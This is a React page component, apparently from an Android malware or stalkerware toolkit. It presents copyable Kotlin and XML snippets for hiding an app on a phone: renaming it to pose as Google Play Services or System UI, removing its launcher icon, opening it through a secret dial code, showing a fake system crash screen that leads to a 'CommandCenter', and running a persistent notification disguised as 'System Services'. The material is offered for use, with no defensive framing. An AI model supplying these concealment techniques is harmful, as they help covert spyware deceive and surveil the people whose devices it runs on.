import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { EyeOff, Smartphone, Code, Key, Package, Copy, Check, ChevronRight, Zap } from 'lucide-react';

const techniques = [
  {
    id: 1, title: 'Rename Package to System App', icon: Package, color: '#22d3ee',
    desc: 'Change package name to look like Android system component',
    code: '// build.gradle\napplicationId "com.android.system.services"\n\n// strings.xml\n<string name="app_name">Android System</string>\n<string name="app_name">Google Play Services</string>\n<string name="app_name">System UI</string>'
  },
  {
    id: 2, title: 'Hide from App Drawer', icon: EyeOff, color: '#f87171',
    desc: 'Remove launcher icon - app becomes completely invisible',
    code: '// REMOVE from AndroidManifest.xml:\n<intent-filter>\n    <action android:name="android.intent.action.MAIN"/>\n    <category android:name="android.intent.category.LAUNCHER"/>\n</intent-filter>\n\n// Access via: dial code, ADB, notification, widget, shake'
  },
  {
    id: 3, title: 'Secret Dial Code Access', icon: Key, color: '#fbbf24',
    desc: 'Open hidden app by dialing secret USSD code',
    code: 'class DialCodeReceiver : BroadcastReceiver() {\n    override fun onReceive(ctx: Context, intent: Intent) {\n        val number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER)\n        when (number) {\n            "*#*#4321#*#*" -> {\n                resultData = null\n                ctx.startActivity(Intent(ctx, MainActivity::class.java))\n            }\n        }\n    }\n}'
  },
  {
    id: 4, title: 'Fake Error Screen', icon: Zap, color: '#fb923c',
    desc: 'App shows fake "System UI has stopped" error, long-press 5x to open',
    code: 'class FakeErrorActivity : AppCompatActivity() {\n    override fun onCreate(savedInstanceState: Bundle?) {\n        setContentView(R.layout.fake_error)\n        closeBtn.setOnLongClickListener {\n            count++\n            if (count >= 5) startActivity(Intent(this, CommandCenter::class.java))\n            true\n        }\n    }\n}'
  },
  {
    id: 5, title: 'Notification Disguise', icon: Smartphone, color: '#34d399',
    desc: 'Persistent notification disguised as "System Services" - tap to access',
    code: 'val notification = NotificationCompat.Builder(this, CHANNEL)\n    .setContentTitle("System Services")\n    .setContentText("Android system is running")\n    .setSmallIcon(R.drawable.ic_system)\n    .setOngoing(true)\n    .setContentIntent(pendingIntent)\n    .build()\nstartForeground(9999, notification)'
  },
];

const StealthMode = () => {
  const [expandedId, setExpandedId] = useState(null);
  const [copied, setCopied] = useState(null);

  const copyCode = async (code, key) => {
    try { await navigator.clipboard.writeText(code); }
    catch {
      const ta = document.createElement('textarea');
      ta.value = code; document.body.appendChild(ta);
      ta.select(); document.execCommand('copy'); document.body.removeChild(ta);
    }
    setCopied(key); setTimeout(() => setCopied(null), 2000);
  };

  return (
    <div className="page-container">
      <div style={{ marginBottom: '28px' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '14px', marginBottom: '8px' }}>
          <EyeOff size={32} color="#8b5cf6" />
          <h1 style={{ fontSize: '28px', fontWeight: 800 }}>Stealth Mode Techniques</h1>
        </div>
        <p style={{ color: 'var(--text-muted)', fontSize: '14px' }}>Hide the app from plain sight. Disguise as system components.</p>
      </div>

      {techniques.map((tech) => (
        <motion.div key={tech.id} initial={{ opacity: 0, y: 15 }} animate={{ opacity: 1, y: 0 }}
          className="glass-card" style={{ marginBottom: '12px', overflow: 'hidden' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '14px', cursor: 'pointer' }}
            onClick={() => setExpandedId(expandedId === tech.id ? null : tech.id)}>
            <div style={{ width: '48px', height: '48px', borderRadius: '14px', background: tech.color + '20', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
              <tech.icon size={24} color={tech.color} />
            </div>
            <div style={{ flex: 1 }}>
              <h3 style={{ fontSize: '15px', fontWeight: 700 }}>{tech.title}</h3>
              <p style={{ fontSize: '12px', color: 'var(--text-secondary)' }}>{tech.desc}</p>
            </div>
            <ChevronRight size={14} style={{ transform: expandedId === tech.id ? 'rotate(90deg)' : 'rotate(0deg)' }} />
          </div>
          {expandedId === tech.id && (
            <div style={{ borderTop: '1px solid var(--border)', marginTop: '14px', paddingTop: '14px', position: 'relative' }}>
              <button onClick={(e) => { e.stopPropagation(); copyCode(tech.code, tech.id); }}
                style={{ position: 'absolute', top: '18px', right: '8px', padding: '5px 12px', background: '#1e2433', border: '1px solid #30363d', borderRadius: '6px', color: '#c9d1d9', cursor: 'pointer', fontSize: '11px', zIndex: 1, display: 'flex', alignItems: 'center', gap: '4px' }}>
                {copied === tech.id ? <Check size={12} color="#34d399" /> : <Copy size={12} />}
                {copied === tech.id ? 'Copied' : 'Copy'}
              </button>
              <pre style={{ background: '#0d1117', color: '#c9d1d9', padding: '16px', borderRadius: '8px', fontSize: '12px', lineHeight: '1.4', overflowX: 'auto', maxHeight: '250px', border: '1px solid #30363d', fontFamily: 'monospace' }}>
                <code>{tech.code}</code>
              </pre>
            </div>
          )}
        </motion.div>
      ))}
    </div>
  );
};

export default StealthMode;
